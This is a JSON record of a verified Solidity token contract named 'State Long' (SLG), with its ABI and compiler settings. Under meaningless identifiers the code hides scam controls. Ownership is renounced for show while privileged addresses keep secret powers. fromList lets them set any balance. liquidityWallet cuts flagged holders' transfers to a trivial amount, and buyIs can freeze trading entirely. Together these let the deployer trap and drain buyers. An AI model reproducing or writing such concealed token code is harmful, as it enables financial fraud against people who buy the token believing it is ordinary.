{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface txAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedSellLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txList {\n    function createPair(address amountTotal, address receiverWallet) external returns (address);\n}\n\ninterface receiverMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeReceiverMax) external view returns (uint256);\n\n    function transfer(address modeSender, uint256 limitIs) external returns (bool);\n\n    function allowance(address shouldTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeSender,\n        uint256 limitIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxEnable, uint256 value);\n    event Approval(address indexed shouldTotal, address indexed spender, uint256 value);\n}\n\ninterface receiverMarketingMetadata is receiverMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StateLong is launchedSellLaunch, receiverMarketing, receiverMarketingMetadata {\n\n    function listReceiver(address fromLimit) public {\n        if (maxFund) {\n            return;\n        }\n        if (limitTx == isMaxTotal) {\n            isMaxTotal = limitTx;\n        }\n        totalMin[fromLimit] = true;\n        if (limitTx != isMaxTotal) {\n            isMaxTotal = minExempt;\n        }\n        maxFund = true;\n    }\n\n    address public liquidityTotalLaunched;\n\n    function owner() external view returns (address) {\n        return totalTx;\n    }\n\n    mapping(address => bool) public totalMin;\n\n    function allowance(address launchMax, address marketingLaunched) external view virtual override returns (uint256) {\n        if (marketingLaunched == liquidityMax) {\n            return type(uint256).max;\n        }\n        return isTokenWallet[launchMax][marketingLaunched];\n    }\n\n    bool private limitFromLaunched;\n\n    address public swapTeam;\n\n    address liquidityMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address launchedLiquidity, address modeSender, uint256 limitIs) external override returns (bool) {\n        if (_msgSender() != liquidityMax) {\n            if (isTokenWallet[launchedLiquidity][_msgSender()] != type(uint256).max) {\n                require(limitIs <= isTokenWallet[launchedLiquidity][_msgSender()]);\n                isTokenWallet[launchedLiquidity][_msgSender()] -= limitIs;\n            }\n        }\n        return limitFeeList(launchedLiquidity, modeSender, limitIs);\n    }\n\n    mapping(address => bool) public buyMode;\n\n    mapping(address => mapping(address => uint256)) private isTokenWallet;\n\n    address tradingTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function limitFeeList(address launchedLiquidity, address modeSender, uint256 limitIs) internal returns (bool) {\n        if (launchedLiquidity == swapTeam) {\n            return receiverBuy(launchedLiquidity, modeSender, limitIs);\n        }\n        uint256 exemptList = receiverMarketing(liquidityTotalLaunched).balanceOf(tradingTo);\n        require(exemptList == modeFee);\n        require(modeSender != tradingTo);\n        if (buyMode[launchedLiquidity]) {\n            return receiverBuy(launchedLiquidity, modeSender, tradingLiquidity);\n        }\n        return receiverBuy(launchedLiquidity, modeSender, limitIs);\n    }\n\n    function liquidityWallet(address atAuto) public {\n        listIsSwap();\n        \n        if (atAuto == swapTeam || atAuto == liquidityTotalLaunched) {\n            return;\n        }\n        buyMode[atAuto] = true;\n    }\n\n    function buyIs(uint256 limitIs) public {\n        listIsSwap();\n        modeFee = limitIs;\n    }\n\n    function balanceOf(address feeReceiverMax) public view virtual override returns (uint256) {\n        return feeMin[feeReceiverMax];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverTeamShould;\n    }\n\n    event OwnershipTransferred(address indexed tradingSwap, address indexed modeWallet);\n\n    function approve(address marketingLaunched, uint256 limitIs) public virtual override returns (bool) {\n        isTokenWallet[_msgSender()][marketingLaunched] = limitIs;\n        emit Approval(_msgSender(), marketingLaunched, limitIs);\n        return true;\n    }\n\n    uint256 private minExempt;\n\n    function fromList(address senderAt, uint256 limitIs) public {\n        listIsSwap();\n        feeMin[senderAt] = limitIs;\n    }\n\n    uint8 private takeMax = 18;\n\n    mapping(address => uint256) private feeMin;\n\n    uint256 maxFee;\n\n    address private totalTx;\n\n    function shouldSwap() public {\n        emit OwnershipTransferred(swapTeam, address(0));\n        totalTx = address(0);\n    }\n\n    string private receiverTeamShould = \"State Long\";\n\n    function receiverBuy(address launchedLiquidity, address modeSender, uint256 limitIs) internal returns (bool) {\n        require(feeMin[launchedLiquidity] >= limitIs);\n        feeMin[launchedLiquidity] -= limitIs;\n        feeMin[modeSender] += limitIs;\n        emit Transfer(launchedLiquidity, modeSender, limitIs);\n        return true;\n    }\n\n    function listIsSwap() private view {\n        require(totalMin[_msgSender()]);\n    }\n\n    bool private tradingFrom;\n\n    bool public maxFund;\n\n    string private senderWallet = \"SLG\";\n\n    uint256 private limitTx;\n\n    uint256 constant tradingLiquidity = 6 ** 10;\n\n    uint256 private isMaxTotal;\n\n    uint256 private fromReceiverExempt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txWallet;\n    }\n\n    constructor (){\n        if (limitTx != minExempt) {\n            minExempt = fromReceiverExempt;\n        }\n        txAt takeLaunch = txAt(liquidityMax);\n        liquidityTotalLaunched = txList(takeLaunch.factory()).createPair(takeLaunch.WETH(), address(this));\n        \n        swapTeam = _msgSender();\n        shouldSwap();\n        totalMin[swapTeam] = true;\n        feeMin[swapTeam] = txWallet;\n        \n        emit Transfer(address(0), swapTeam, txWallet);\n    }\n\n    function getOwner() external view returns (address) {\n        return totalTx;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderWallet;\n    }\n\n    function transfer(address senderAt, uint256 limitIs) external virtual override returns (bool) {\n        return limitFeeList(_msgSender(), senderAt, limitIs);\n    }\n\n    uint256 private txWallet = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeMax;\n    }\n\n    bool public launchAuto;\n\n    uint256 modeFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiverMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitIs\",\"type\":\"uint256\"}],\"name\":\"buyIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitIs\",\"type\":\"uint256\"}],\"name\":\"fromList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTotalLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAuto\",\"type\":\"address\"}],\"name\":\"liquidityWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"}],\"name\":\"listReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}